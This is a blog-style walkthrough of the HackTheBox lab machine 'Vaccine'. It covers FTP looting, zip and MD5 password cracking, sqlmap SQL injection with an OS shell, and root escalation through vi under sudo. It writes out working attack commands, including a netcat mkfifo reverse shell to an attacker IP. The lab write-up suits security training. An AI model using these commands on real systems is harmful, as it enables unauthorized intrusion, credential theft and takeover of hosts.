## HTB Starting Point: Vaccine
Today I worked on a few of the starting point machines from HackTheBox, as I have decided to hang out over here more. I just wanted to work on some boxes without the hand holding I feel like TryHackMe does. I wanted to do something blindly here and figure it out on my own. That’s not to say anything bad about THM. I love it. It is a great site and I have learned a lot from it, but THM is for learning while HTB is for sharpening. It is the same thing just with the training wheels removed.
So, let us get started on the first of my HTB writeups I will start doing here. This is Vaccine, a standard webserver with some lite password cracking, automated SQL injection to gain a foothold, and a relatively quick privesc after the fact. 
 
### Recon
I began by quickly port scanning the server to see where I could get in. I found a few open ports like ftp (21), ssh (22), and http (80). However, the FTP caught my eye due to an accessible zip file which nmaps default script scan was able to catch.
  
![alt text](https://github.com/RazTheGoon/Vaccine/blob/main/VaccineImages/nmap.jpg)
 
So, I accessed the ftp server as anonymous and was able to get the file onto my local machine. However, upon trying to access it, I found the zip was password protected. This is where this machine’s lite password cracking begins.  
I ran zip2john on the zip file and output the hash to a separate file which I could then run john on. 
```zip2john backup.zip > zip.hash```
```john zip.hash```
This gave me a password which I was able to use to unzip the backup.zip file. Contained inside were 2 files, index.php and style.css  
  
I figured these were files for the webserver but catted them out first to check. Turns out index.php had a username and password within. Though the password was hidden behind some md5. That’s easy enough to correct by using any number of tools. I like [CrackStation](https://www.crackstation.net)
  
![alt text](https://github.com/RazTheGoon/Vaccine/blob/main/VaccineImages/index_cat.jpg)


After getting the username and password, it was time to go check out the website. 
 
I was greeted with a login page which gave me a chance to use the credentials. They worked
  
I found this lovely little page that appears to show a database of available models made by The MegaCorp Car Company.
  
![alt text](https://github.com/RazTheGoon/Vaccine/blob/main/VaccineImages/cars.jpg)
  
Searching the catalog will change the URL to show you query in the URL. This seem like something that could be vulnerable to SQL injection. 
So, I decided to run sqlmap on it to see. 
``` sqlmap -u "http://10.129.95.174/dashboard.php?search=" --cookie="PHPSESSID="```
This confirmed that the search was indeed vulnerable to SQLI via the UNION operator. So, I reran the command with the ```--os-shell``` option to see if I could get a shell as the database user. 
  
![alt text](https://github.com/RazTheGoon/Vaccine/blob/main/VaccineImages/oshell.jpg)
  
It worked! 
  
### Now to get a real shell. 
I decided to go over to [RevShellGenerator]( https://www.revshells.com/) to make a reverse shell that would work correctly. My go-to is the nc mkfifo option. Plugging in my machines IP and preferred port left me with this:

```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.100 6666 >/tmp/f```
   
After setting up my netcat listener and dropping the rev shell into my os-shell, I got a connection!  
  
![alt text](https://github.com/RazTheGoon/Vaccine/blob/main/VaccineImages/revshell.jpg)
  
A quick shell upgrade with

```python3 -c 'import pty; pty.spawn("/bin/bash")'```  
  
### Now to search for a path to escalation. 
Note: I kept experiencing drops of my shell around this time. Sqlmap was unable to connect to the site and I would often lose my reverse shell. I think this was the HTB network, but I could always be wrong. If you have any ideas let me know! I chose to work fast through this inconvenience so pardon the lack of images past this point.
Normally I would pull over a script like linpeas.sh but the drops made me have to work manually. So I went through the file system looking for interesting files to work with. 
Running sudo -l required a password I didn’t have yet.
So, I checked:
/home  
/tmp   
/var/www/html  
In /var/www/html I ran  

```grep -I -R “pass”*```  

And found a cleartext password for the postgres user. Now let’s try ```sudo -l```
This let me know, before disconnecting again, that I could run vi as root. I know for a fact that there is an entry on [GTFObins]( https://gtfobins.github.io/) for that.
  
![alt text](https://github.com/RazTheGoon/Vaccine/blob/main/VaccineImages/gtfobins.jpg)
  
I dropped connection again. So, I decided to go back in through ssh using the password I just found. It worked much better for me after that.
Ok. So now that I have a more stable shell, I can take more descriptive pictures
  
![alt text](https://github.com/RazTheGoon/Vaccine/blob/main/VaccineImages/sudol.jpg)

```sudo -l``` showed me that I can use vi to privesc. A quick search on GTFObins gave me a few attack options. I tried to run ``` sudo vi -c ':!/bin/sh' /dev/null``` but it wasn’t getting me anywhere.

Then I tried the shell breakout methods. Method A didn’t work but method B did. 

First, I ran ```sudo vi /etc/postgresql/11/main/pg_hba.conf```

Then once vi opened I typed 
  
:set shell=/bin/sh
:shell
  
This gave me root!
![alt text](https://github.com/RazTheGoon/Vaccine/blob/main/VaccineImages/root.jpg)

All that was left was to enter my flags on HTB. 
![alt text](https://github.com/RazTheGoon/Vaccine/blob/main/VaccineImages/pwnd.jpg)

Thanks for reading!
